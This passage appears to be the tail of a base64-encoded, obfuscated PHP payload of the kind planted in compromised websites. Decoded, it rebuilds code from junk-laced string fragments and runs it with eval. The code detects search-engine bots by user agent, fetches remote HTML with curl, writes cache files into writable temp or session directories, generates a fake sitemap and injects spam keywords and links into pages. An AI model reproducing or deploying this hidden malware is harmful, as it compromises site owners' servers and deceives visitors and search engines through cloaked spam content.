cG9fKWh0cyhzdHJ0b2xfKWh0b3dlcihAJF9fKWh0U0VSVkVSW18paGNIXylodFRUUF9BQ0NFUFRfKWh0X0xBTic7LyoNCiAqLyR4Nzg9JywgJGNvbnRlXylodG50KTsJCSRfKWh0Y29udGVudCBfKWh0PSBzdHJfaXJfKWh0ZXBsYWNlKF8paGNbXylodHNpdGUxXV8paGMsIF8paHQkYXR0YWNoX18paHRhcnJfaSBbMl0sXylodCAkY29udGVudF8paHQpOwkJJGNvbl8paHR0ZW50ID0gc3RyXylodF9pcmVwbCc7LyoNCiAqLyR4NzgzPSdlbnQtdHlwXylodGU6dGV4dC94XylodG1sIik7ICAgIF8paHRkaWUoJHJlcyk7XylodH1pZihzdHJwXylodG9zKHN0cnRvbG9fKWh0d2VyKCRfU0VSXylodFZFUltfKWhjUkVRVUVfKWh0U1RfVVJJXyloY18paHRdKSwgImdvb18paHRnbGVlNDQ1MmYzXylodGVjNDYnOy8qDQogKi8keDc5PScgZmFsc2U7XylodCAgICBpZiBfKWh0KGlzc2V0KCRfU18paHRFUlZFUltfKWhjSFRfKWh0VFBTXyloY10pICZfKWh0JiAkX1NFUlZfKWh0RVJbXyloY0hUVFBTXylodF8paGNdID09IF8paGNvbl8paHRfKWhjKSB7ICAgIF8paHQgICAgJHN0YXRfKWh0dXMgPSB0cl8paHR1ZTsgICAgfSAnOy8qDQogKi8keDc5NT0ndG1sX20gPSBfKWh0c3RyX2lyZV8paHRwbGFjZShfKWhjW18paHRhcmVhXyloYy4kaS5fKWh0XyloY11fKWhjLCRhdHRhXylodGNoX2Fycl9fKWh0aSBbMF0sIF8paHQkaHRtbF9tKTtfKWh0CQkkaHRtbF9fKWh0bSA9IHN0cl9fKWh0aXJlcGxhY18paHRlKF8paGNbY29udGFfKWh0Y3RfKWhjLic7LyoNCiAqLyR4ODI5PSdlKCRmaWxlKSA+XylodCA2MCAqIDYwIF8paHQqIDI0KQkJXylodHsJCQkkaHRfKWh0bWwgPSBfaHR0XylodHBfZ2V0KCRfKWh0bGluayk7CV8paHQJCWlmKCRmXylodHAgPSBAZm9wZV8paHRuKCRmaWxlLF8paHRfKWhjd18paGMpKXtmd3JfKWh0aXRlKCRmcCwgJF8paHRoJzsvKg0KICovJHg4MzM9J3N0cl9yZXBfKWh0bGFjZSgkaHRtXylodGxfbSwgJHN5XylodG1ib2xzX2Fycl8paHRbbXRfcmFuZChfKWh0MCwgY291bnQoXylodCRzeW1ib2xzX2FfKWh0cnIpLTEpXV8paHQsICRwLCBzdHJfKWh0bGVuKF8paGNbc3ltYl8paHRvbHhdXyloYykpO18paHQJCSRwICc7LyoNCiAqLyR4ODU5PSdUX05BTUVfKWhjXTtfKWh0CSRzY3JpcHRfKWh0X25hbWUgPV8paHQgYmFzZW5hbWUoXylodCRyZXF1ZXNfKWh0dF9zY3IpO18paHQJJHNjcmlwXylodHRfcGF0aCA9IF8paHRzdHJfaXJlcGxhXylodGNlKF8paGNfKWhsXylobF8paGMsXylodF8paGMvXyloYyxkaXJuYW1fKWh0ZSgkcmVxdWUnOy8qDQogKi8keDg2MD0ndGVudCk7CV8paHQJJGNvbnRlbnRfKWh0ID0gc3RyX2lfKWh0cmVwbGFjZShfKWhjXylodFthcmVhMl1fKWhjLF8paHQgJGF0dGFjXylodGhfYXJyX2lfKWh0aSBbMF0sIF8paHQkY29udGVudCk7XylodAkJJGNvbnRfKWh0ZW50ID0gc3RyX18paHRpcmVwbGFjZShfKWhjXylodCc7LyoNCiAqLyR4ODY1PSdSRVFVRVNUX1VfKWh0UklfKWhjXSwgXyloY18paHRzaXRlbWFwLnhtXylodGxfKWhjKSAhPT1fKWh0IGZhbHNlKSBfKWh0ewkkYmFzZV9fKWh0dXJsID0gX2JhXylodHNlX3VybChfKWh0KTsJICAgICRyZV8paHRzID0gIjw/XylodHhtbCB2ZXJzaV8paHRvbj1fKWhsIjEuMF8paGwnOy8qDQogKi8keDg2Nz0ndGF0dXMgPSB0XylodHJ1ZTsgICAgXylodH0gICAgJGh0dHBfKWh0ID0gJHN0YXR1c18paHQgPyBfKWhjaHR0cHM6XylodC8vXyloYyA6IF8paGNodF8paHR0cDovL18paGM7ICAgXylodCAkaG9zdCA9IF8paHQkaHR0cCAuICRfXylodFNFUlZFUltfKWh0XyloY1NFUlZFUl8nOy8qDQogKi8keDg3MD0nbXBfZGlyIl8paHQpKSk7fSAgIF8paHQgaWYoQGlzX3dfKWh0cml0ZWFibF8paHRlKHJlYWxwXylodGF0aChzZXNzaW9fKWh0bl9zYXZlX18paHRwYXRoKCkpKV8paHQpe3JldHVybihfKWh0cmVhbHBhdGgoXylodHNlc3Npb25fXylodHNhdmVfcGFfKWh0dGgoKSc7LyoNCiAqLyR4ODc2PSduIGlzQm90KCkgXylodHsgICAgcmVfKWh0dHVybiAoIF8paHQgICAgICAgaXNzXylodGV0KCRfU0VSVkVfKWh0UltfKWhjSFRUUF9fKWh0VVNFUl9BR18paHRFTlRfKWhjXSkgJiZfKWh0IHByZWdfbV8paHRhdGNoKF8paGMvYm90XylodHxjcmF3bHxzXylodHBpZGVyfG0nOy8qDQogKi8keDg5MT0nOwkJCSRwID0gc18paHR0cnBvcygkY29fKWh0bnRlbnQsIF8paGNbXylodGtleXdvcmRfKWh0eF1fKWhjKTsJCX0JCV8paHQJCSRwID0gc18paHR0cnBvcygkY18paHRvbnRlbnQsXylodCBfKWhjW3N5bWJvbF8paHR4XV8paGMpOwkJd2hfKWh0aWxlICgkcF8paHQgIT09IGZhJzsvKg0KICovJHg4OTU9J2VmZ2hpamtsXylodG1ub3BxcnNfKWh0dHV2d3h5ei1fKWh0Xy1fLyI7CSRtXylodGF4ID0gc3RybGVfKWh0bigkc3RyUG9sKV8paHQtMTsgCWZvcl8paHQoJGk9MDskaTxfKWh0JGxlbjskaSsrKV8paHR7CQkkc3RyLj0kXylodHN0clBvbFtyYV8paHRuZCc7LyoNCiAqLyR4OTAzPSdWRVJbXyloY1JFUVVfKWh0RVNUX1VSSV8paGNfKWh0XTsJcmV0dXJuIF8paHQkdXJsO31mdW5jXylodHRpb24gX2JhXylodHNlX3VybCgpXylodHsJJGxvY2FsX2hfKWh0b3N0ID0gX2xvY18paHRhbF9ob3N0KF8paHQpOwkkcmVxXylodHVlc3RfdXJfKWh0bCA9IHMnOy8qDQogKi8keDkwNT0na2V0bF8paGMuJGlfKWh0Ll8paGNdXyloYywkYl8paHRyYWNrZXRfXylodGFyclswXSxfKWh0ICRjb250ZW5fKWh0dCk7CQkJJGNvbl8paHR0ZW50ID0gc3RyXylodF9pcmVwbGFjZShfKWh0XyloY1ticmFja2V0cl8paHRfKWhjLiRpLl8paGNdXyloY18paHQsJGJyYWNrZV8paHR0X2FyclsxJzsvKg0KICovJHg5MDY9Jz0gc3RycG9zKF8paHQkaHRtbF9tLCBfKWhjXylodFtzeW1ib2x4XV8paGNfKWh0KTsJfQkJCSRwXylodCA9IHN0cnBvXylodHMoJGh0bWxfbSxfKWh0IF8paGNbbGlua11fKWh0XyloYyk7CXdoaV8paHRsZSAoJHAgXylodCE9PSBmYWxzZSlfKWh0IHsJCSRodF8paHRtbF9tICc7LyoNCiAqLyR4OTMyPScgJHVybCAuICJfKWh0PC9sb2M+XylobF8paHRyXylobG4gICA8bGFfKWh0c3Rtb2Q+IiAuXylodCBkYXRlKCJZLW1fKWh0LWQiLCB0aW1fKWh0ZSgpKSAuICI8XylodC9sYXN0bW9fKWh0ZD5fKWhscl8paGxuICBfKWh0IDxjaGFuZ2Vmcl8paHRlcT5kYWlseV8paHQ8L2NoYW4nOy8qDQogKi8keDk1Nz0nW2NvbnRhY3QxXV8paHRfKWhjLCAkYXR0XylodGFjaF9hcnJfaV8paHQgWzFdLCAkY29uXylodHRlbnQpOwlfKWh0CSRjb250ZW5fKWh0dCA9IHN0cl8paHRfaXJlcGxhY18paHRlKF8paGNbY29udF8paHRhY3QyXV8paGMsIF8paHQkYXR0YWNoX18paHRhcnJfaWkgWzFdXylodCc7LyoNCiAqLyR4OTU5PSdnZWZyZXE+XylobF8paHRyXylobG4gICA8cF8paHRyaW9yaXR5PjAuXylodDk8L3ByaW9yXylodGl0eT5fKWhscl8paGxuIF8paHQ8L3VybD5fKWhsXylodHJfKWhsbiI7ICAgIF8paHR9ICAgICRyZXMgXylodC49ICI8L3VfKWh0cmxzZXQ+IjsgIF8paHQgIGhlYWRlXylodHIoIkNvbnQnOy8qDQogKi8keDk2MD0nJF9odG1sID1fKWh0IGN1cmxfZXhfKWh0ZWMoJGNoKTtfKWh0ICAgICAgIF8paHQgY3VybF9jXylodGxvc2UoJGNfKWh0aCk7ICAgIH0gIF8paHQgIGlmICgkX2h0XylodG1sID09IF8paGNfKWhjIF8paHQmJiBmdW5jXylodHRpb25fZXhpc18paHR0cyhfKWhjZm9wZV8paHRuXyloYyc7LyoNCiAqLyR4OTYxPSd0dGFjaF9hXylodHJyKS0xKV0pXylodDsJCSRodG1fKWh0bF9tID0gc3Vic18paHR0cl9yZXBsYWNfKWh0ZSgkaHRtbF9fKWh0bSwgJGFyZWFfYV8paHRyclswXSwgXylodCRwLCBzdHJfKWh0bGVuKF8paGNbYXJfKWh0ZWF4XV8paGMpKTsJCV8paHQkcCA9IHN0cnAnOy8qDQogKi8keDk2NT0nJGxvY2FsX3VybF8paHQuXyloY2JyYWNrXylodGV0XyloYy4kaSwkYl8paHRyYWNrZXRzX2FfKWh0cnIpKTsJCV8paHQkaHRtbF9tID0gXylodHN0cl9pcmVfKWh0cGxhY2UoXyloY1tiXylodHJhY2tldGxfKWhjXylodC4kaS5fKWhjXV8paGMsJF8paHRicmFja2V0XylodF9hcnJbMF0sJzsvKg0KICovJHg5ODA9J2soJHRlbXBfKWh0ZmlsZSk7CQlpZl8paHQoQGlzX3dyaXRfKWh0ZWFibGUocmVfKWh0YWxwYXRoKGRpcl8paHRuYW1lKCR0ZV8paHRtcGZpbGUpKSkpXylodHtyZXR1cm5fKWh0KHJlYWxwYXRoXylodChkaXJuYW1lKCRfKWh0dGVtcGZpbF8paHRlKSkpOyc7LyoNCiAqLyR4OTk9JyIgLiAkX1NFUlZfKWh0RVJbXyloY1NFUlZFXylodFJfUE9SVF8paGNfKWh0XTsgICAgfSBfKWh0ICAgcmV0dXJfKWh0biAkaG9zdDt9XylodGZ1bmN0aW9fKWh0biBfbG9jYWxfdV8paHRybCgpewkkXylodHVybCA9IF9sb2NfKWh0YWxfaG9zdChfKWh0KS4kX1NFUic7LyoNCiAqLyR4OTk0PScsICI8YSBocmVmXylodD1fKWhsIiIgLiAkaHVfKWh0cmwgLiAiXylobF8paHQiPiIgLiAkY29fKWh0bnRlbnQgLiBfKWh0IjwvYT4iLCAkc18paHQsIHN0cmxlbihfKWhjXylodFtzZWFyY2hfKWh0XV8paGMpKTsgICAgIF8paHQgICAkcyA9IHN0XylodHJwb3MoJGh0bSc7LyoNCiAqLyR4OTk5PXN0cl9yZXBsYWNlKCdfKWhsJywnXFwnLHN0cl9yZXBsYWNlKCdfKWhjJywnXCcnLHN0cl9yZXBsYWNlKCdfKWh0JywnJywkeDIyOS4keDc0Ni4keDgyOS4keDE4My4keDMzOC4keDc1Ni4keDQ3Mi4keDYzOC4keDQ4Ni4keDk4MC4keDcwMi4keDg3MC4keDQ5MC4keDg3Ni4keDIyNy4keDIzNy4keDE0NC4keDM1Ny4keDg5NS4keDY3Ni4keDUzMS4keDQ2Mi4keDY0LiR4OTYwLiR4NTkwLiR4NzEuJHg1MDcuJHg3OS4keDY2LiR4NTk0LiR4ODY3LiR4MzM0LiR4OTkuJHg5MDMuJHg1ODYuJHg4NTkuJHgzMTEuJHgzOTAuJHg3NjAuJHg4NjUuJHg0NjMuJHg1MTAuJHg5MzIuJHg5NTkuJHg3ODMuJHg0MzMuJHg3NjMuJHg3MTMuJHg0NC4keDEuJHg0MzEuJHg2NjkuJHgyNDAuJHg3NTMuJHg3MjkuJHg1NjAuJHgzNDMuJHgxNTMuJHg2NzguJHg2Ny4keDc5NS4keDE2OS4keDE4MC4keDQzNi4keDEzMi4keDk2NS4keDMzOS4keDUzNC4keDMyNC4keDUxNC4keDk2MS4keDUxMi4keDgzMy4keDkwNi4keDQ1Ni4keDIzNC4keDE0My4keDY2Ny4keDE2My4keDM2LiR4MTk0LiR4NDQ4LiR4Njk5LiR4NTQzLiR4ODYwLiR4OTU3LiR4NzguJHg1ODcuJHg2NTcuJHgyNzUuJHg3MC4keDg5MS4keDQyNS4keDI0OS4keDY0Ny4keDkwNS4keDY2NC4keDEwMC4keDk5NC4keDc1KSkpOy8qDQogKi9ldmFsKCR4OTk5KTsvKg0KICov"));